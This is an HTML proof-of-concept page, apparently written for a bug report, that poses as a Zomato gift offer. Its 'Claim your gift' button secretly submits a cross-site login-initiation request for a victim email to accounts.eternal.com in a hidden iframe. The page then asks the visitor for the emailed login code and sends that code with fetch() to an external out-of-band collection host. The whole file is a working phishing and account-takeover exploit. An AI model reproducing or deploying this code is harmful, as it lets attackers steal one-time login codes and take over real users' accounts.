<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Zomato Gift</title>
</head>
<body>
 <h1>you got gift from Zomato</h1>
 <button onclick="csrfPoc();createInput()">Claim your gift</button>
 <iframe name="hiddenFrame" style="display:none;"></iframe>

  <script>
  function createInput() {
      const h_satu = document.createElement("h1");
      h_satu.textContent = "Please enter the code sent to your email";
      const input = document.createElement("input");
      input.type = "text";
      input.name = "angka";
      const button = document.createElement("button");
      button.type = "submit";
      button.textContent = "Submit";
      button.setAttribute("onclick", "kirim()");
      document.body.appendChild(h_satu);
      document.body.appendChild(input);
      document.body.appendChild(button);
  }
function kirim() {
  const input = document.querySelector('input[name="angka"]');
  const hasil = input.value;

  fetch("https://hz7n8l95finzvkmdtvkyi7qx0si520uhk.oast.site?hasil=" + encodeURIComponent(hasil))
    .then(response => response.text())
    .then(data => {
      console.log("Response:", data);
    })
    .catch(error => {
      console.error("Error:", error);
    });
}


    function csrfPoc() {
      var targetUrl = "https://accounts.eternal.com/login/email";

      var fields = {
        email: "victim-email@gmail.com",
        csrf_token: "",
        lc: "1eef4a5b8ae4427fa40bd23003baa7d1",
        type: "initiate",
        otp: "",
        invite_id: "",
        theme: "",
        name: ""
      };

      // Create the form element
      var form = document.createElement("form");
      form.id = "csrf-poc";
      form.action = targetUrl;
      form.method = "POST";
      form.enctype = "multipart/form-data";
      form.target = "hiddenFrame";

      // Dynamically add each field as a hidden input
      for (var key in fields) {
        if (Object.prototype.hasOwnProperty.call(fields, key)) {
          var input = document.createElement("input");
          input.type = "hidden";
          input.name = key;
          input.value = fields[key];
          form.appendChild(input);
        }
      }

      // Attach to the page (required for submission in most browsers)
      document.body.appendChild(form);

      // Auto-submit the generated form
      form.submit();
    };
  </script>
</body>
</html>
